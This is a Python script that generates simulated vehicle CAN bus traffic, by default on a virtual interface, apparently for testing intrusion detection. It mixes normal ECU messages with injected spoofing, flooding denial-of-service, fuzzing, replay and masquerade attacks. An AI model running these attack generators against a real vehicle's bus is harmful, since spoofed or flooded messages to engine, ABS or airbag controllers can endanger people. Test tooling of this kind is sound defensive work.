#!/usr/bin/env python3
"""
generate_can_traffic.py - Generate normal and attack CAN traffic for testing
"""

import can
import time
import random
import argparse
import logging
from typing import List, Dict
from enum import Enum

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Types of CAN bus attacks"""
    NORMAL = "normal"
    SPOOFING = "spoofing"
    DOS = "dos"
    FUZZING = "fuzzing"
    REPLAY = "replay"
    MASQUERADE = "masquerade"


class CANTrafficGenerator:
    """Generate CAN bus traffic including normal and attack scenarios"""
    
    def __init__(self, interface: str = 'vcan0', bitrate: int = 500000):
        """
        Initialize CAN traffic generator
        
        Args:
            interface: CAN interface name
            bitrate: CAN bus bitrate
        """
        self.interface = interface
        self.bitrate = bitrate
        
        try:
            self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
            logger.info(f"Connected to CAN interface: {interface}")
        except Exception as e:
            logger.error(f"Failed to connect to CAN interface: {e}")
            raise
        
        # Normal CAN IDs for different ECUs
        self.normal_ids = {
            0x100: "Engine Control Unit",
            0x200: "Transmission Control",
            0x300: "ABS Control",
            0x400: "Airbag Control",
            0x500: "Climate Control",
            0x600: "Body Control",
            0x700: "Instrument Cluster",
        }
        
        # Message history for replay attacks
        self.message_history: List[can.Message] = []
        self.max_history = 100
    
    def generate_normal_message(self, can_id: int) -> can.Message:
        """Generate a normal CAN message"""
        # Generate realistic data based on CAN ID
        if can_id == 0x100:  # Engine
            # RPM, temperature, throttle position
            data = bytes([
                random.randint(0, 255),  # RPM high
                random.randint(0, 255),  # RPM low
                random.randint(70, 90),  # Temperature
                random.randint(0, 100),  # Throttle
                0, 0, 0, 0
            ])
        elif can_id == 0x200:  # Transmission
            data = bytes([
                random.randint(1, 6),    # Gear
                random.randint(0, 1),    # Mode
                random.randint(0, 255),  # Speed high
                random.randint(0, 255),  # Speed low
                0, 0, 0, 0
            ])
        elif can_id == 0x300:  # ABS
            data = bytes([
                random.randint(0, 1),    # ABS active
                random.randint(0, 255),  # Wheel speed FL
                random.randint(0, 255),  # Wheel speed FR
                random.randint(0, 255),  # Wheel speed RL
                random.randint(0, 255),  # Wheel speed RR
                0, 0, 0
            ])
        else:
            data = bytes([random.randint(0, 255) for _ in range(8)])
        
        return can.Message(
            arbitration_id=can_id,
            data=data,
            is_extended_id=False
        )
    
    def generate_spoofing_attack(self) -> can.Message:
        """Generate a spoofing attack message (impersonate legitimate ECU)"""
        # Use a legitimate ID but with malicious data
        can_id = random.choice(list(self.normal_ids.keys()))
        # Inject obviously wrong data
        data = bytes([0xFF] * 8)  # All max values
        
        return can.Message(
            arbitration_id=can_id,
            data=data,
            is_extended_id=False
        )
    
    def generate_dos_attack(self) -> List[can.Message]:
        """Generate DoS attack (flood the bus)"""
        # Send many high-priority messages
        messages = []
        for _ in range(10):  # Burst of messages
            can_id = random.randint(0x000, 0x0FF)  # High priority
            data = bytes([random.randint(0, 255) for _ in range(8)])
            messages.append(can.Message(
                arbitration_id=can_id,
                data=data,
                is_extended_id=False
            ))
        return messages
    
    def generate_fuzzing_attack(self) -> can.Message:
        """Generate fuzzing attack (random invalid messages)"""
        # Completely random CAN ID and data
        can_id = random.randint(0x000, 0x7FF)
        data_len = random.randint(0, 8)
        data = bytes([random.randint(0, 255) for _ in range(data_len)])
        
        return can.Message(
            arbitration_id=can_id,
            data=data,
            is_extended_id=False
        )
    
    def generate_replay_attack(self) -> can.Message:
        """Generate replay attack (resend captured message)"""
        if not self.message_history:
            # If no history, generate a normal message
            return self.generate_normal_message(random.choice(list(self.normal_ids.keys())))
        
        # Replay a random message from history
        return random.choice(self.message_history)
    
    def generate_masquerade_attack(self) -> can.Message:
        """Generate masquerade attack (use valid format but wrong ECU)"""
        # Use an ID from a different ECU type
        can_id = random.choice(list(self.normal_ids.keys()))
        # But send data typical of another ECU
        different_id = random.choice([id for id in self.normal_ids.keys() if id != can_id])
        msg = self.generate_normal_message(different_id)
        msg.arbitration_id = can_id
        return msg
    
    def send_traffic(self, duration: int, attack_type: AttackType = AttackType.NORMAL, 
                     attack_rate: float = 0.1, message_rate: int = 100):
        """
        Send CAN traffic for a specified duration
        
        Args:
            duration: Duration in seconds
            attack_type: Type of attack to inject
            attack_rate: Proportion of attack messages (0.0 to 1.0)
            message_rate: Messages per second
        """
        logger.info(f"Starting traffic generation: {attack_type.value} for {duration}s")
        logger.info(f"Message rate: {message_rate}/s, Attack rate: {attack_rate*100}%")
        
        start_time = time.time()
        message_count = 0
        attack_count = 0
        
        try:
            while time.time() - start_time < duration:
                # Determine if this should be an attack message
                is_attack = random.random() < attack_rate and attack_type != AttackType.NORMAL
                
                if is_attack:
                    # Generate attack message based on type
                    if attack_type == AttackType.SPOOFING:
                        msg = self.generate_spoofing_attack()
                        self.bus.send(msg)
                        attack_count += 1
                    elif attack_type == AttackType.DOS:
                        msgs = self.generate_dos_attack()
                        for msg in msgs:
                            self.bus.send(msg)
                        attack_count += len(msgs)
                    elif attack_type == AttackType.FUZZING:
                        msg = self.generate_fuzzing_attack()
                        self.bus.send(msg)
                        attack_count += 1
                    elif attack_type == AttackType.REPLAY:
                        msg = self.generate_replay_attack()
                        self.bus.send(msg)
                        attack_count += 1
                    elif attack_type == AttackType.MASQUERADE:
                        msg = self.generate_masquerade_attack()
                        self.bus.send(msg)
                        attack_count += 1
                else:
                    # Generate normal message
                    can_id = random.choice(list(self.normal_ids.keys()))
                    msg = self.generate_normal_message(can_id)
                    self.bus.send(msg)
                    
                    # Store in history for replay attacks
                    self.message_history.append(msg)
                    if len(self.message_history) > self.max_history:
                        self.message_history.pop(0)
                
                message_count += 1
                
                # Control message rate
                time.sleep(1.0 / message_rate)
                
        except KeyboardInterrupt:
            logger.info("Traffic generation interrupted by user")
        finally:
            elapsed = time.time() - start_time
            logger.info(f"Traffic generation complete:")
            logger.info(f"  Total messages: {message_count}")
            logger.info(f"  Attack messages: {attack_count}")
            logger.info(f"  Duration: {elapsed:.2f}s")
            logger.info(f"  Actual rate: {message_count/elapsed:.1f} msg/s")
    
    def close(self):
        """Close the CAN bus connection"""
        self.bus.shutdown()
        logger.info("CAN bus connection closed")


def main():
    parser = argparse.ArgumentParser(description='Generate CAN bus traffic with attack scenarios')
    parser.add_argument('--interface', default='vcan0', help='CAN interface (default: vcan0)')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds (default: 60)')
    parser.add_argument('--attack', choices=[a.value for a in AttackType], default='normal',
                        help='Attack type (default: normal)')
    parser.add_argument('--attack-rate', type=float, default=0.1,
                        help='Attack message rate 0.0-1.0 (default: 0.1)')
    parser.add_argument('--message-rate', type=int, default=100,
                        help='Messages per second (default: 100)')
    
    args = parser.parse_args()
    
    # Create generator
    generator = CANTrafficGenerator(interface=args.interface)
    
    try:
        # Send traffic
        attack_type = AttackType(args.attack)
        generator.send_traffic(
            duration=args.duration,
            attack_type=attack_type,
            attack_rate=args.attack_rate,
            message_rate=args.message_rate
        )
    finally:
        generator.close()


if __name__ == "__main__":
    main()
